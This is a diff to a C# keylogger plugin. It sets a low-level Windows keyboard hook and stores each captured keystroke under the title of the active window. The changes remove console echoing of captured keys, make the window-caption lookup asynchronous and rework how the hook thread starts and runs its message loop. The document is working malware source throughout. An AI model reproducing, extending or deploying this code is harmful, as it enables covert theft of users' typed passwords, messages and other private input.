@@ -238,7 +238,6 @@ namespace Plugin
                 {
                     applicationkeylogs.Add(open_application, "");
                 }
-                Console.WriteLine(character);
                 applicationkeylogs[open_application] += character;
             }
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
@@ -256,7 +255,7 @@ namespace Plugin
                 string retchar = await GetKey();
                 if (retchar != null)
                 {
-                    string open_application = Utils.GetCaptionOfActiveWindow().Replace("*","");
+                    string open_application = (await Utils.GetCaptionOfActiveWindowAsync()).Replace("*","");
                     if (!applicationkeylogs.ContainsKey(open_application)) 
                     {
                         applicationkeylogs.Add(open_application, "");
@@ -379,15 +378,17 @@ namespace Plugin
         {
             if (owner && !started)
             {
-                started = true;
+                HookCallbackDelegate hcDelegate = HookCallback;
+                Process currproc = Process.GetCurrentProcess();
+                string mainModuleName = currproc.MainModule.ModuleName;
+                currproc.Dispose(); started = true;
                 new Thread(() =>
                 {
-                    HookCallbackDelegate hcDelegate = HookCallback;
-                    Process currproc = Process.GetCurrentProcess();
-                    string mainModuleName = currproc.MainModule.ModuleName;
-                    currproc.Dispose();
                     key_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);
-                    Application.Run();//this is blocking, fix it
+                    if (!Application.MessageLoop)
+                    {
+                        Application.Run();
+                    }
                 }).Start();
                 return;
             }
